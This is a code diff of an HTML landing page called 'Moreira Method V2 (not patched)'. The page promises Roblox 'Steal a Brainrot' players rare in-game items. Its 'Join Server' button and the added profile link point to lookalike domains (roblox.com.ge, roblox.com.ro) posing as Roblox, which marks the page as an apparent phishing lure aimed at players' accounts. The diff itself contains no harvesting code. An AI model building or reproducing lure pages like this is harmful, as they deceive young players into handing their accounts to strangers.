@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title> Moreira Method V2 (not patched) 🔥</title>
+  <title>Moreira Method V2 (not patched) 🔥</title>
   <meta name="description" content="Select a category before joining the Roblox server.">
   <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&display=swap" rel="stylesheet">
   <style>
@@ -26,12 +26,53 @@
       justify-content: center;
       min-height: 100vh;
       padding: 2rem;
+      position: relative;
     }
     h1 {
       text-align: center;
-      font-size: 2.3rem;
+      font-size: 2.8rem;
       margin-bottom: 2rem;
-      letter-spacing: 0.5px;
+      letter-spacing: 1px;
+      font-weight: 900;
+      background: linear-gradient(90deg, #a8ff60, #ffffff, #a8ff60);
+      background-size: 200% 200%;
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      animation: shine 3s ease-in-out infinite;
+      text-shadow: 0 0 3px #a8ff60, 0 0 6px #ffffff;
+    }
+    @keyframes shine {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+    .top-left {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      display: flex;
+      align-items: center;
+      gap: 0.8rem;
+      background-color: var(--card);
+      padding: 0.5rem 1rem 0.5rem 0.5rem;
+      border-radius: var(--radius);
+      border: 2px solid var(--accent);
+      transition: transform 0.3s ease, border-color 0.3s ease;
+      text-decoration: none;
+      color: var(--text);
+      font-weight: 600;
+    }
+    .top-left:hover {
+      transform: scale(1.05);
+      border-color: var(--hover);
+      color: var(--hover);
+    }
+    .avatar-img {
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      object-fit: cover;
+      border: 2px solid var(--accent);
     }
     .box-container {
       display: grid;
@@ -45,14 +86,40 @@
       background-color: var(--card);
       border: 2px solid transparent;
       border-radius: var(--radius);
-      padding: 1.5rem 1rem;
+      padding: 1rem;
       text-align: center;
       cursor: pointer;
       transition: all 0.25s ease;
       user-select: none;
       font-size: 1rem;
       font-weight: 600;
+      color: var(--text);
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.6rem;
+      flex-direction: column;
     }
+
+    /* First 4 boxes slightly smaller */
+    .box[data-name="strawberry"] img,
+    .box[data-name="burguro"] img,
+    .box[data-name="ketchuru"] img,
+    .box[data-name="garama"] img {
+      width: 100px;
+      height: 100px;
+    }
+
+   /* Ketupat and Los67 smaller but not stretched */
+.box[data-name="ketupat"] img,
+.box[data-name="los67"] img {
+  width: 80px;
+  height: auto; /* maintain aspect ratio */
+  object-fit: contain;
+}
+
+
     .box:hover {
       border-color: var(--accent);
       transform: translateY(-3px);
@@ -84,30 +151,51 @@
   </style>
 </head>
 <body>
+  <a class="top-left" href="https://roblox.com.ro/users/5681620590/profile" target="_blank" rel="noopener noreferrer">
+    <img class="avatar-img" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-1F1AE8D3A733C86BB2CC3EF699D53B92-Png/150/150/AvatarHeadshot/Webp/noFilter" alt="Profile Avatar">
+    <span>Want to help? Add me!</span>
+  </a>
+
   <h1>🔥 Moreira Method</h1>
 
   <div class="box-container">
-    <div class="box" data-name="strawberry">Strawberry Elephant (if you are lucky you get one)</div>
-    <div class="box" data-name="burguro">Burguro and Fryuro</div>
-    <div class="box" data-name="ketchuru">Ketchuru and Musturu</div>
-    <div class="box" data-name="garama">Garama and Madungdung</div>
-    <div class="box" data-name="ketupat">Ketupat Kepat</div>
-    <div class="box" data-name="los67">Los 67</div>
+    <div class="box" data-name="strawberry">
+      <img src="https://media.discordapp.net/attachments/1395554103484088361/1429531251416502392/latest.png?ex=68f67a39&is=68f528b9&hm=e53991a0ccdbea8cdb60f6d54986f4f77456cb296fecc70637398110181a3e87&=&format=webp&quality=lossless&width=320&height=320" alt="Strawberry Elephant">
+      Strawberry Elephant (if you are lucky you get one)
+    </div>
+    <div class="box" data-name="burguro">
+      <img src="https://media.discordapp.net/attachments/1395554103484088361/1429532481912176831/latest.png?ex=68f67b5f&is=68f529df&hm=367b2054c0ba346053e98e93fccb97d795498d8c55878b06ec119663d1b1c7c1&=&format=webp&quality=lossless&width=589&height=686" alt="Burguro">
+      Burguro and Fryuro
+    </div>
+    <div class="box" data-name="ketchuru">
+      <img src="https://media.discordapp.net/attachments/1395554103484088361/1429532141313855581/latest.png?ex=68f67b0d&is=68f5298d&hm=e7bcab78c81b212ab3c6ba758f0aece31e194c966221fa34360be1435db6b801&=&format=webp&quality=lossless&width=431&height=438" alt="Ketchuru">
+      Ketchuru and Musturu
+    </div>
+    <div class="box" data-name="garama">
+      <img src="https://media.discordapp.net/attachments/1395554103484088361/1429531667583991848/latest.png?ex=68f67a9c&is=68f5291c&hm=6a4a50ddee54afd38175d6a3cf28e3f9c7ae317192323abba840011f53616881&=&format=webp&quality=lossless&width=889&height=799" alt="Garama">
+      Garama and Madungdung
+    </div>
+    <div class="box" data-name="ketupat">
+      <img src="https://media.discordapp.net/attachments/1397035307311960184/1429535413655306383/latest.png?ex=68f67e1a&is=68f52c9a&hm=58a37848d2f0e23ece3bc8b9ca34b473ddd561623609b32fddbc09cdf201001a&=&format=webp&quality=lossless&width=580&height=441" alt="Ketupat">
+      La Spooky Grande
+    </div>
+    <div class="box" data-name="los67">
+      <img src="https://media.discordapp.net/attachments/1395554103484088361/1429531512616779816/latest.png?ex=68f67a78&is=68f528f8&hm=a1c334e99ab84f1638e2d1de2a86f04c9daf2130c9ce26f76b1b10df5a93bf2a&=&format=webp&quality=lossless&width=774&height=941" alt="Los67">
+      Meowl
+    </div>
   </div>
 
   <a id="joinBtn" class="btn" href="https://roblox.com.ge/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=40619253849477242853837679746393" target="_blank" rel="noopener noreferrer">
     Join Server
   </a>
-  
+   
   <footer>
     © <span id="year"></span> Moreira Method
   </footer>
 
   <script>
-    // Auto update year
     document.getElementById('year').textContent = new Date().getFullYear();
 
-    // Box click highlight
     const boxes = document.querySelectorAll('.box');
     boxes.forEach(box => {
       box.addEventListener('click', () => {
@@ -117,6 +205,4 @@
     });
   </script>
 </body>
-
 </html>
-
